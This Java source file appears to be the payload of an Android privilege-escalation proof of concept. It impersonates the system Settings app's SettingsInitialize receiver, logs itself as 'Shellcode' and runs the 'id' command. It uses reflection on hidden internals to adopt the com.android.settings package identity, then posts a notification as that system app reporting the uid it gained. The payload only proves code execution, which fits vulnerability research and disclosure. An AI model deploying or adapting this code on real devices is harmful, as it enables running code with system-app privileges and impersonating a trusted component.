package com.android.settings;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Process;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Field;

public class SettingsInitialize extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.v("Shellcode", "Hello from uid=" + Process.myUid());

        String id;
        try {
            id = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("id").getInputStream())).readLine();
        } catch (IOException e) {
            e.printStackTrace();
            id = "uid=" + Process.myUid() + ". Execution of id command failed";
        }

        fixContext(context);

        NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        nm.createNotificationChannel(new NotificationChannel("shellcode", "Shellcode report", NotificationManager.IMPORTANCE_HIGH));
        nm.notifyAsPackage("com.android.settings", null, 0, new Notification.Builder(context, "shellcode")
                .setSmallIcon(android.R.drawable.ic_menu_help)
                .setContentTitle("Hello from uid="+android.os.Process.myUid())
                .setContentText(id)
                .setStyle(new Notification.BigTextStyle().bigText(id))
                .build());
    }

    /**
     * Set {@link Context#getPackageName()} to name matching our new uid
     *
     * This code is being executed in system settings app so can use hidden apis.
     */
    static void fixContext(Context context) {
        while (context instanceof ContextWrapper) {
            context = ((ContextWrapper) context).getBaseContext();
        }

        try {
            Field mPackageInfo = Class.forName("android.app.ContextImpl").getDeclaredField("mPackageInfo");
            mPackageInfo.setAccessible(true);
            Object loadedApk = mPackageInfo.get(context);
            Field mPackageName = loadedApk.getClass().getDeclaredField("mPackageName");
            mPackageName.setAccessible(true);
            mPackageName.set(loadedApk, "com.android.settings");
        } catch (NoSuchFieldException | ClassNotFoundException | IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }
}
